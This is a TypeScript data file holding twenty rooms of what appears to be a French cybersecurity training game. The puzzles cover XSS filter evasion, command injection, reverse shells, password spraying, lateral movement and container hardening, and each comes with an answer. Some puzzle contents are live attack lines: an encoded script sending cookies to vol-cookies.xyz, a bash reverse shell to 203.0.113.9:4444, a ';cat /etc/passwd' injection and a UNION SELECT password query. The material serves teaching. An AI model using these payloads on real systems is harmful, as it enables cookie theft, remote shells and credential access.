import { toBase64, toUrl } from "@/lib/crypto";
import type { RoomContent } from "@/lib/types";

const EVASION = toUrl(toBase64("<script>fetch('https://vol-cookies.xyz/?c='+document.cookie)</script>"));

/** Salles 21 à 40 du niveau Difficile. */
export const DIFFICILE_3: RoomContent[] = [
  {
    id: "difficile-21",
    name: "Le filtre contourné",
    story: "Le site bloque le mot « script » dans la recherche. Pourtant, une attaque est passée : le pirate a encodé sa charge deux fois pour tromper le filtre.",
    card: {
      title: "Le contournement de filtres",
      category: "Web",
      icon: "🥷",
      summary: "Encoder une attaque pour qu'un filtre trop simple ne la reconnaisse pas.",
      details: [
        "Un filtre qui cherche un mot interdit (« script », « SELECT ») se contourne en encodant la charge.",
        "Les attaquants empilent URL, Base64, majuscules, caractères Unicode…",
        "La vraie parade n'est pas de filtrer des mots, mais d'échapper les sorties et d'utiliser des requêtes préparées.",
      ],
      hint: "Défais les couches dans l'ordre : d'abord les %XX (URL), puis le Base64.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "paramètre q reçu par le serveur",
      content: EVASION,
      tools: ["url", "base64", "hex", "reverse"],
      workshopInput: EVASION,
      question: "Vers quel domaine le script envoie-t-il les cookies ?",
      answers: ["vol-cookies.xyz"],
      placeholder: "exemple.com",
    },
    successText: "Charge décodée. Le site échappe désormais les sorties au lieu de filtrer des mots.",
  },
  {
    id: "difficile-22",
    name: "La photo de profil",
    story: "Le site du pirate permet d'envoyer une photo de profil. Un fichier nommé « avatar.php.jpg » a été accepté… et exécuté par le serveur.",
    card: {
      title: "L'upload de fichiers malveillants",
      category: "Web",
      icon: "📤",
      summary: "Un fichier envoyé par un utilisateur ne doit jamais pouvoir s'exécuter sur le serveur.",
      details: [
        "Un attaquant peut déguiser un script (PHP…) en image pour qu'il soit exécuté une fois sur le serveur.",
        "Ne pas se fier à l'extension ni au type annoncé : vérifier le contenu réel du fichier.",
        "Renommer les fichiers, les stocker hors du dossier web et interdire leur exécution.",
      ],
      hint: "Le serveur s'est fié au nom du fichier, pas à son contenu.",
    },
    puzzle: {
      kind: "choice",
      question: "Quelle mesure aurait empêché l'attaque ?",
      options: [
        { label: "Vérifier seulement que le nom contient « .jpg »", correct: false, explanation: "C'est exactement ce que le pirate a contourné." },
        { label: "Vérifier le contenu réel, renommer le fichier et interdire son exécution", correct: true, explanation: "Le fichier reste une simple donnée, jamais du code exécuté." },
        { label: "Limiter la taille des images", correct: false, explanation: "Un script malveillant peut être tout petit." },
      ],
    },
    successText: "Les fichiers envoyés sont maintenant renommés, vérifiés et jamais exécutés.",
  },
  {
    id: "difficile-23",
    name: "L'outil de diagnostic",
    story: "Le panneau du pirate propose de « tester une adresse IP » avec la commande ping. Ce que tu tapes est directement collé dans une commande système.",
    card: {
      title: "L'injection de commandes",
      category: "Web",
      icon: "⌨️",
      summary: "Quand une saisie est insérée dans une commande système, on peut y ajouter ses propres commandes.",
      details: [
        "Les caractères ; && | permettent d'enchaîner plusieurs commandes dans un terminal.",
        "Si le site exécute « ping » + ta saisie, tu peux ajouter n'importe quelle commande derrière.",
        "Parade : ne jamais passer de saisie à un shell, utiliser des fonctions dédiées et valider strictement l'entrée.",
      ],
      hint: "Quelle saisie ajoute une deuxième commande après le ping ?",
    },
    puzzle: {
      kind: "choice",
      contentLabel: "code du panneau",
      content: `$ip = $_GET['ip'];
system("ping -c 1 " . $ip);`,
      question: "Quelle saisie permet de lire le fichier /etc/passwd ?",
      options: [
        { label: "8.8.8.8", correct: false, explanation: "C'est une saisie normale : seul le ping s'exécute." },
        { label: "8.8.8.8; cat /etc/passwd", correct: true, explanation: "Le point-virgule enchaîne une deuxième commande, exécutée par le serveur." },
        { label: "' OR 1=1 --", correct: false, explanation: "C'est une injection SQL, pas une injection de commandes." },
        { label: "<script>alert(1)</script>", correct: false, explanation: "C'est un test de XSS." },
      ],
    },
    successText: "Injection prouvée. Le panneau valide maintenant que la saisie est bien une adresse IP.",
  },
  {
    id: "difficile-24",
    name: "Le bouton invisible",
    story: "Une page propose de « cliquer ici pour gagner un bon d'achat ». Mais sous le bouton, invisible, se cache le bouton « Supprimer mon compte » d'un autre site.",
    card: {
      title: "Le clickjacking",
      category: "Web",
      icon: "🫥",
      summary: "Faire cliquer quelqu'un sur un élément caché d'un autre site.",
      details: [
        "La page piégée affiche le vrai site dans un cadre transparent (iframe), placé sous un faux bouton.",
        "La victime croit cliquer sur le faux bouton, mais clique sur le vrai site où elle est connectée.",
        "Parade : l'en-tête X-Frame-Options ou la directive CSP frame-ancestors empêchent d'afficher le site dans un cadre.",
      ],
      hint: "Le vrai site est affiché, invisible, par-dessus ou sous un leurre.",
    },
    puzzle: {
      kind: "choice",
      question: "Quelle protection doit ajouter le site ciblé ?",
      options: [
        { label: "L'en-tête X-Frame-Options: DENY (ou CSP frame-ancestors)", correct: true, explanation: "Le site ne peut plus être affiché dans le cadre d'une autre page." },
        { label: "Un mot de passe plus long", correct: false, explanation: "La victime est déjà connectée : le mot de passe ne change rien." },
        { label: "Un antivirus", correct: false, explanation: "Rien de malveillant n'est installé : tout se passe dans le navigateur." },
      ],
    },
    successText: "X-Frame-Options activé : le site ne peut plus être piégé dans un cadre.",
  },
  {
    id: "difficile-25",
    name: "La redirection",
    story: "Le lien du mail de phishing commence bien par https://banque-horizon.fr… mais il utilise une fonction de redirection du vrai site.",
    card: {
      title: "La redirection ouverte",
      category: "Web",
      icon: "↪️",
      summary: "Un vrai site qui accepte de rediriger vers n'importe quelle adresse sert de tremplin aux pirates.",
      details: [
        "Une page /redirect?url=… qui redirige sans vérifier la destination est une « open redirect ».",
        "Le lien commence par le vrai domaine, ce qui inspire confiance, puis renvoie vers un faux site.",
        "Parade : n'autoriser que des destinations internes ou une liste blanche.",
      ],
      hint: "Regarde où mène le paramètre url après la redirection.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "lien du mail",
      content: "https://banque-horizon.fr/redirect?url=https://banque-horizon-espace.com/connexion",
      question: "Sur quel domaine la victime arrive-t-elle finalement ?",
      answers: ["banque-horizon-espace.com"],
      placeholder: "exemple.com",
    },
    successText: "Redirection ouverte corrigée : elle n'accepte plus que des pages du site.",
  },
  {
    id: "difficile-26",
    name: "Le dossier oublié",
    story: "En explorant le site du pirate, tu tentes d'ouvrir /.git/config. Le serveur répond 200 OK.",
    card: {
      title: "Les fichiers sensibles exposés",
      category: "Web",
      icon: "🗃️",
      summary: "Des fichiers techniques laissés en ligne peuvent révéler tout le code ou des secrets.",
      details: [
        "Un dossier .git accessible permet de télécharger tout le code source et son historique.",
        "Autres classiques : .env (secrets), backup.zip, fichiers .bak, pages phpinfo().",
        "Parade : ne déployer que les fichiers nécessaires et bloquer l'accès aux fichiers cachés.",
      ],
      hint: "Que contient un dépôt Git ?",
    },
    puzzle: {
      kind: "choice",
      contentLabel: "réponse du serveur",
      content: `GET /.git/config  →  200 OK
[core]
    repositoryformatversion = 0
[remote "origin"]
    url = https://github.com/pirate/panel-prive.git`,
      question: "Pourquoi est-ce grave ?",
      options: [
        { label: "Ce n'est pas grave, ce n'est qu'un fichier de configuration", correct: false, explanation: "Ce fichier prouve que tout le dossier .git est accessible." },
        { label: "On peut télécharger tout le code source et son historique, secrets compris", correct: true, explanation: "Mots de passe et clés oubliés dans d'anciens commits deviennent lisibles." },
        { label: "Ça ralentit le site", correct: false, explanation: "Le problème est la fuite d'informations." },
      ],
    },
    successText: "Code source récupéré : une clé d'API était cachée dans un ancien commit.",
  },
  {
    id: "difficile-27",
    name: "La page de connexion",
    story: "Tu dois sécuriser la page de connexion de l'entreprise contre les attaques par force brute. Quelles mesures retiens-tu ?",
    card: {
      title: "Protéger une page de connexion",
      category: "Défense",
      icon: "🚧",
      summary: "Ralentir, détecter et bloquer les essais de mots de passe en masse.",
      details: [
        "Limiter le nombre d'essais par compte et par adresse IP, avec un délai croissant.",
        "Double authentification et CAPTCHA après plusieurs échecs.",
        "Messages d'erreur identiques, que l'identifiant existe ou non (pour éviter l'énumération).",
      ],
      hint: "Un message qui dit « cet utilisateur n'existe pas » aide le pirate.",
    },
    puzzle: {
      kind: "multi",
      question: "Quelles mesures protègent la page de connexion ?",
      options: [
        { label: "Limiter le nombre de tentatives", correct: true, explanation: "La force brute devient beaucoup trop lente." },
        { label: "Activer la double authentification", correct: true, explanation: "Même un mot de passe deviné ne suffit plus." },
        { label: "Afficher « cet identifiant n'existe pas » quand c'est le cas", correct: false, explanation: "Le pirate peut ainsi lister les comptes existants." },
        { label: "Ajouter un CAPTCHA après plusieurs échecs", correct: true, explanation: "Les robots sont freinés." },
        { label: "Alerter le SOC en cas d'échecs en série", correct: true, explanation: "L'attaque est détectée pendant qu'elle a lieu." },
      ],
    },
    successText: "Page de connexion blindée. La prochaine force brute s'arrêtera au 5e essai.",
  },
  {
    id: "difficile-28",
    name: "Les deux messages",
    story: "Sur le portail du pirate, tu tapes un identifiant au hasard, puis « admin ». Les messages d'erreur ne sont pas les mêmes.",
    card: {
      title: "L'énumération de comptes",
      category: "Web",
      icon: "📋",
      summary: "Deviner quels comptes existent grâce à des réponses différentes du site.",
      details: [
        "Des messages différents (« utilisateur inconnu » / « mot de passe incorrect ») révèlent les comptes existants.",
        "Un temps de réponse différent peut aussi trahir l'existence d'un compte.",
        "Parade : un message unique (« identifiants incorrects ») et un comportement identique dans tous les cas.",
      ],
      hint: "Le site dit clairement quand un compte existe.",
    },
    puzzle: {
      kind: "choice",
      contentLabel: "essais de connexion",
      content: `identifiant : zorglub   →  « Cet utilisateur n'existe pas. »
identifiant : admin     →  « Mot de passe incorrect. »`,
      question: "Qu'apprend le pirate ?",
      options: [
        { label: "Rien du tout", correct: false, explanation: "Les messages différents lui donnent une information." },
        { label: "Que le compte « admin » existe", correct: true, explanation: "Il peut maintenant concentrer sa force brute sur ce compte." },
        { label: "Le mot de passe d'admin", correct: false, explanation: "Pas encore… mais il sait quel compte viser." },
      ],
    },
    successText: "Message unifié : « Identifiants incorrects », quel que soit le cas.",
  },
  {
    id: "difficile-29",
    name: "La pluie de tentatives",
    story: "Cette nuit, le journal montre une seule tentative par compte, mais sur 300 comptes différents, toujours avec le même mot de passe.",
    card: {
      title: "Le password spraying",
      category: "Mots de passe",
      icon: "🌧️",
      summary: "Essayer un mot de passe courant sur des centaines de comptes, plutôt que des centaines de mots de passe sur un seul compte.",
      details: [
        "En ne faisant qu'un essai par compte, l'attaquant évite le blocage après plusieurs échecs.",
        "Il utilise des mots de passe très courants (Saison+année, Entreprise123…).",
        "Détection : beaucoup de comptes différents en échec depuis une même source, avec le même timing.",
      ],
      hint: "Ce n'est pas la force brute classique : regarde le nombre de comptes visés.",
    },
    puzzle: {
      kind: "choice",
      contentLabel: "journal d'authentification (extrait)",
      content: `02:00:01 échec  a.martin   depuis 203.0.113.45  mdp testé : Automne2026!
02:00:02 échec  b.durand   depuis 203.0.113.45  mdp testé : Automne2026!
02:00:03 échec  c.leroy    depuis 203.0.113.45  mdp testé : Automne2026!
…        (297 autres comptes, même mot de passe)
02:05:12 succès z.petit    depuis 203.0.113.45`,
      question: "De quelle attaque s'agit-il ?",
      options: [
        { label: "Force brute classique sur un seul compte", correct: false, explanation: "Ici, chaque compte n'est essayé qu'une seule fois." },
        { label: "Password spraying", correct: true, explanation: "Un mot de passe courant, essayé sur des centaines de comptes." },
        { label: "Phishing", correct: false, explanation: "Aucun message n'a été envoyé aux victimes." },
      ],
    },
    successText: "Spraying détecté. Le compte z.petit est verrouillé, son mot de passe changé.",
  },
  {
    id: "difficile-30",
    name: "Les rois du domaine",
    story: "Dans l'Active Directory de l'entreprise, le groupe « Admins du domaine » contrôle toutes les machines. Quelqu'un s'y est ajouté.",
    card: {
      title: "L'Active Directory",
      category: "Système",
      icon: "🏰",
      summary: "L'annuaire qui gère les comptes et les droits de tout un réseau Windows.",
      details: [
        "L'Active Directory centralise utilisateurs, ordinateurs, groupes et règles de sécurité.",
        "Les « Admins du domaine » ont tous les pouvoirs : c'est la cible ultime d'un attaquant.",
        "Ce groupe doit rester minuscule et surveillé : tout ajout doit déclencher une alerte (événement 4728/4732).",
      ],
      hint: "Cherche le compte qui n'a rien à faire dans ce groupe.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "net group \"Admins du domaine\" /domain",
      content: `Nom du groupe   Admins du domaine
Commentaire     Administrateurs désignés du domaine

Membres
-------------------------------------------
Administrateur    adm-jmartin    adm-lpetit
stagiaire-imprimante`,
      question: "Quel compte suspect a été ajouté au groupe ?",
      answers: ["stagiaire-imprimante"],
    },
    successText: "Compte retiré du groupe. Une alerte surveille désormais chaque ajout.",
  },
  {
    id: "difficile-31",
    name: "Le saut de machine en machine",
    story: "Le pirate est entré par un poste de travail. Les journaux montrent qu'il a ensuite rebondi vers les serveurs, en bureau à distance.",
    card: {
      title: "Le mouvement latéral",
      category: "Réseau",
      icon: "🦘",
      summary: "Passer d'une machine compromise à une autre pour atteindre les cibles intéressantes.",
      details: [
        "Après l'accès initial, l'attaquant explore le réseau et se déplace avec des identifiants volés (RDP, SMB, PsExec…).",
        "Une machine qui se connecte soudain à beaucoup d'autres est un signal d'alerte.",
        "La segmentation du réseau et des comptes admin distincts freinent ces déplacements.",
      ],
      hint: "Quelle machine sert de point de départ à toutes les connexions vers les serveurs ?",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "connexions RDP (Event 4624, type 10)",
      content: `09:12  PC-ACCUEIL-02  →  SRV-FICHIERS
09:15  PC-ACCUEIL-02  →  SRV-COMPTA
09:19  PC-ACCUEIL-02  →  SRV-AD-01
09:30  PC-RH-07       →  SRV-FICHIERS   (habituel)`,
      question: "Quelle machine le pirate utilise-t-il comme tremplin ?",
      answers: ["PC-ACCUEIL-02"],
    },
    successText: "PC-ACCUEIL-02 isolé : le pirate ne peut plus rebondir.",
  },
  {
    id: "difficile-32",
    name: "Le réveil programmé",
    story: "Chaque nuit à 3 h, un programme se lance sur le serveur. Le planificateur de tâches Windows a été modifié par le pirate.",
    card: {
      title: "Les tâches planifiées",
      category: "Système",
      icon: "⏰",
      summary: "Programmer un malware pour qu'il se relance tout seul, à heure fixe.",
      details: [
        "Le planificateur de tâches (schtasks) lance des programmes à des moments définis.",
        "Les attaquants s'en servent pour la persistance (ATT&CK T1053).",
        "Méfie-toi des tâches au nom générique qui lancent un programme depuis un dossier utilisateur ou temporaire.",
      ],
      hint: "Compare les chemins des programmes lancés par chaque tâche.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "schtasks /query /fo LIST (extrait)",
      content: `Nom de la tâche : \\Microsoft\\Windows\\Defrag\\ScheduledDefrag
Tâche à exécuter : %windir%\\system32\\defrag.exe -c

Nom de la tâche : \\GoogleUpdateTaskMachine
Tâche à exécuter : C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua

Nom de la tâche : \\MiseAJourSysteme
Tâche à exécuter : C:\\Users\\Public\\Videos\\maj.exe -hidden`,
      question: "Quel est le nom de la tâche malveillante ?",
      answers: ["MiseAJourSysteme", "\\MiseAJourSysteme"],
    },
    successText: "Tâche supprimée, maj.exe en quarantaine. Plus de réveil à 3 h.",
  },
  {
    id: "difficile-33",
    name: "La connexion inversée",
    story: "L'EDR a enregistré une commande étrange sur le serveur web. Le pirate a obtenu un terminal à distance en faisant se connecter le serveur… vers lui.",
    card: {
      title: "Le reverse shell",
      category: "Système",
      icon: "🔄",
      summary: "La victime se connecte d'elle-même à l'attaquant, ce qui contourne beaucoup de pare-feu.",
      details: [
        "Les pare-feu bloquent souvent les connexions entrantes, mais laissent sortir les connexions.",
        "Un reverse shell fait sortir la connexion de la victime vers la machine de l'attaquant, qui obtient un terminal.",
        "Détection : processus shell avec une connexion réseau sortante, ports inhabituels (4444…).",
      ],
      hint: "Dans /dev/tcp/IP/PORT, le dernier nombre est le port.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "ligne de commande enregistrée",
      content: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
      question: "Sur quel port l'attaquant attend-il la connexion ?",
      answers: ["4444"],
    },
    successText: "Connexion vers 203.0.113.9:4444 bloquée, serveur isolé.",
  },
  {
    id: "difficile-34",
    name: "Le carnet à usage unique",
    story: "Le pirate a chiffré deux messages avec exactement la même clé XOR aléatoire, aussi longue que les messages. Il pense que c'est incassable.",
    card: {
      title: "Le masque jetable",
      category: "Crypto",
      icon: "📓",
      summary: "Incassable en théorie… à condition de n'utiliser la clé qu'une seule fois.",
      details: [
        "Le one-time pad utilise une clé aléatoire aussi longue que le message.",
        "S'il est bien utilisé, il est mathématiquement incassable.",
        "Mais réutiliser la clé permet de combiner deux messages chiffrés et de faire disparaître la clé.",
      ],
      hint: "« Jetable » : le mot dit tout.",
    },
    puzzle: {
      kind: "choice",
      question: "Pourquoi le pirate se trompe-t-il ?",
      options: [
        { label: "Parce que la clé est trop longue", correct: false, explanation: "Une clé aussi longue que le message est justement la règle." },
        { label: "Parce qu'une clé de masque jetable ne doit servir qu'une seule fois", correct: true, explanation: "En combinant les deux messages chiffrés, la clé s'annule et les textes se retrouvent." },
        { label: "Parce que le XOR n'est pas un vrai chiffrement", correct: false, explanation: "Le XOR est la base du masque jetable : c'est la réutilisation qui pose problème." },
      ],
    },
    successText: "Les deux messages sont déchiffrés grâce à la clé réutilisée.",
  },
  {
    id: "difficile-35",
    name: "Le secret partagé",
    story: "Deux serveurs doivent se mettre d'accord sur une clé secrète en communiquant sur un réseau que le pirate écoute entièrement. Est-ce possible ?",
    card: {
      title: "L'échange de clés",
      category: "Crypto",
      icon: "🤝",
      summary: "Deux parties peuvent créer un secret commun sans jamais l'envoyer sur le réseau.",
      details: [
        "L'échange Diffie-Hellman permet de calculer une clé partagée à partir de valeurs publiques.",
        "Un espion qui voit tous les échanges ne peut pas recalculer la clé.",
        "Il est au cœur de TLS (HTTPS), de SSH et des messageries chiffrées, combiné à des signatures pour éviter l'homme du milieu.",
      ],
      hint: "C'est exactement le problème que résout Diffie-Hellman.",
    },
    puzzle: {
      kind: "choice",
      question: "Que peuvent faire les deux serveurs ?",
      options: [
        { label: "C'est impossible : tout ce qui passe sur le réseau est vu par le pirate", correct: false, explanation: "Diffie-Hellman permet justement de le faire." },
        { label: "Utiliser un échange de clés Diffie-Hellman", correct: true, explanation: "Ils calculent la même clé sans jamais l'envoyer." },
        { label: "Envoyer la clé encodée en Base64", correct: false, explanation: "Le Base64 se décode en une seconde." },
      ],
    },
    successText: "Clé partagée établie sous les yeux du pirate, qui ne peut rien en faire.",
  },
  {
    id: "difficile-36",
    name: "Le mail signé",
    story: "Un mail du directeur sécurité demande de désactiver l'antivirus pour une mise à jour. Comment être sûr qu'il vient vraiment de lui ?",
    card: {
      title: "La signature des mails",
      category: "Crypto",
      icon: "🖋️",
      summary: "Une signature numérique prouve l'auteur d'un mail et que son contenu n'a pas été modifié.",
      details: [
        "S/MIME et PGP permettent de signer (et chiffrer) un mail avec la clé privée de l'expéditeur.",
        "Le destinataire vérifie la signature avec la clé publique : le nom affiché, lui, se falsifie facilement.",
        "Pour une demande sensible, une vérification par un autre canal reste indispensable.",
      ],
      hint: "Le nom affiché ne prouve rien. Qu'est-ce qui le prouverait ?",
    },
    puzzle: {
      kind: "choice",
      question: "Qu'est-ce qui prouve le mieux l'origine du mail ?",
      options: [
        { label: "Le nom affiché « Directeur Sécurité »", correct: false, explanation: "N'importe qui peut écrire ce nom." },
        { label: "Une signature S/MIME ou PGP valide, et une vérification par téléphone", correct: true, explanation: "La signature prouve l'auteur ; l'appel confirme une demande sensible." },
        { label: "Le logo dans la signature du mail", correct: false, explanation: "Un logo se copie en une seconde." },
      ],
    },
    successText: "Le mail n'était pas signé, et le directeur n'avait rien demandé.",
  },
  {
    id: "difficile-37",
    name: "Le contrat de l'intrusion",
    story: "L'entreprise engage une équipe pour tester ses défenses. Remets les étapes d'un test d'intrusion dans l'ordre.",
    card: {
      title: "Le test d'intrusion",
      category: "Défense",
      icon: "🎯",
      summary: "Attaquer un système avec autorisation, méthodiquement, pour trouver les failles avant les pirates.",
      details: [
        "Tout commence par un cadre écrit : périmètre, dates, autorisation du propriétaire.",
        "Puis reconnaissance, recherche de failles, exploitation contrôlée.",
        "Le livrable essentiel est le rapport, avec les failles classées et les recommandations.",
      ],
      hint: "Sans autorisation, aucune étape suivante n'est légale.",
    },
    puzzle: {
      kind: "order",
      question: "Dans quel ordre se déroule un test d'intrusion ?",
      items: [
        "Définir le périmètre et obtenir l'autorisation écrite",
        "Reconnaissance et collecte d'informations",
        "Recherche et exploitation des vulnérabilités",
        "Rédaction du rapport et des recommandations",
      ],
    },
    successText: "Méthodologie validée. Le rapport liste 12 failles à corriger.",
  },
  {
    id: "difficile-38",
    name: "L'application trop curieuse",
    story: "Un mail invite à « ouvrir un document partagé » via une application nommée « Lecteur PDF Pro ». Elle demande l'accès à tous tes mails et fichiers.",
    card: {
      title: "Le phishing par consentement",
      category: "Social",
      icon: "🪪",
      summary: "Pas besoin de voler ton mot de passe si tu donnes toi-même l'accès à ton compte.",
      details: [
        "L'attaquant crée une fausse application et te demande d'autoriser son accès via la vraie page de connexion (OAuth).",
        "Une fois autorisée, l'appli lit tes mails et fichiers, même si tu changes ton mot de passe.",
        "Vérifie toujours les permissions demandées, et révoque les applis inconnues dans les paramètres de ton compte.",
      ],
      hint: "Un lecteur PDF n'a aucune raison de lire tous tes mails.",
    },
    puzzle: {
      kind: "choice",
      contentLabel: "écran d'autorisation",
      content: `« Lecteur PDF Pro » souhaite :
  ✔ Lire, envoyer et supprimer vos e-mails
  ✔ Accéder à tous vos fichiers
  ✔ Conserver l'accès même lorsque vous n'êtes pas connecté
[ Accepter ]   [ Annuler ]`,
      question: "Que fais-tu ?",
      options: [
        { label: "J'accepte, c'est la vraie page de connexion de ma messagerie", correct: false, explanation: "La page est vraie, mais l'application est malveillante." },
        { label: "J'annule et je signale le mail", correct: true, explanation: "Ces permissions n'ont rien à voir avec la lecture d'un PDF." },
        { label: "J'accepte puis je change mon mot de passe", correct: false, explanation: "L'autorisation reste valable même après un changement de mot de passe." },
      ],
    },
    successText: "Autorisation refusée. L'application est bloquée pour toute l'entreprise.",
  },
  {
    id: "difficile-39",
    name: "Le pare-feu applicatif",
    story: "Devant le site de l'entreprise, un nouveau filtre analyse chaque requête HTTP. Il vient de bloquer une injection SQL.",
    card: {
      title: "Le WAF",
      category: "Défense",
      icon: "🛡️",
      summary: "Un pare-feu qui comprend le web et bloque les attaques applicatives connues.",
      details: [
        "Le WAF inspecte le contenu des requêtes HTTP (paramètres, en-têtes, corps).",
        "Il bloque les motifs d'attaque connus : injections SQL, XSS, scanners, traversée de répertoires.",
        "C'est une couche en plus : il ne remplace pas un code sûr, car il peut être contourné.",
      ],
      hint: "Un pare-feu réseau regarde les ports ; celui-ci regarde le contenu des requêtes.",
    },
    puzzle: {
      kind: "choice",
      contentLabel: "journal du WAF",
      content: `BLOCK  203.0.113.77  GET /produit?id=1' UNION SELECT password FROM users--
       règle : SQL Injection Attack Detected`,
      question: "Quel est le rôle d'un WAF ?",
      options: [
        { label: "Filtrer les requêtes HTTP pour bloquer les attaques web connues", correct: true, explanation: "Il inspecte le contenu des requêtes, pas seulement les ports." },
        { label: "Remplacer la correction des failles dans le code", correct: false, explanation: "Il peut être contourné : le code doit rester sûr." },
        { label: "Chiffrer les données de la base", correct: false, explanation: "Ce n'est pas son rôle." },
      ],
    },
    successText: "Le WAF a tenu. La faille SQL est quand même corrigée dans le code.",
  },
  {
    id: "difficile-40",
    name: "Les conteneurs",
    story: "Le pirate a pris le contrôle d'un serveur à partir d'un conteneur Docker mal configuré. Trouve toutes les erreurs.",
    card: {
      title: "La sécurité des conteneurs",
      category: "Système",
      icon: "📦",
      summary: "Un conteneur mal configuré peut donner accès à toute la machine hôte.",
      details: [
        "Un conteneur lancé en root, en mode privilégié ou avec le socket Docker monté peut prendre le contrôle de l'hôte.",
        "Les secrets ne doivent jamais être inscrits dans l'image.",
        "Bonnes pratiques : image minimale et à jour, utilisateur non root, droits limités, version précise plutôt que « latest ».",
      ],
      hint: "Il y a quatre erreurs. Une image minimale, elle, est une bonne pratique.",
    },
    puzzle: {
      kind: "multi",
      contentLabel: "Dockerfile et lancement",
      content: `FROM python:latest
ENV DB_PASSWORD=Sup3rS3cret!
COPY . /app
CMD ["python", "/app/main.py"]

docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock app`,
      question: "Quelles sont les mauvaises pratiques ?",
      options: [
        { label: "Le mot de passe écrit dans l'image (ENV DB_PASSWORD)", correct: true, explanation: "Toute personne qui récupère l'image lit le secret." },
        { label: "Le mode --privileged", correct: true, explanation: "Il donne au conteneur presque tous les droits sur l'hôte." },
        { label: "Le socket Docker monté dans le conteneur", correct: true, explanation: "Il permet de lancer d'autres conteneurs et de contrôler l'hôte." },
        { label: "L'image « latest » non figée", correct: true, explanation: "La version change sans contrôle : une version précise est préférable." },
        { label: "Utiliser une image officielle minimale", correct: false, explanation: "C'est une bonne pratique : moins de logiciels, moins de failles." },
      ],
    },
    successText: "Conteneur reconfiguré : non root, sans privilèges, secrets externalisés. Un cap est franchi, la suite t'attend !",
  },
];
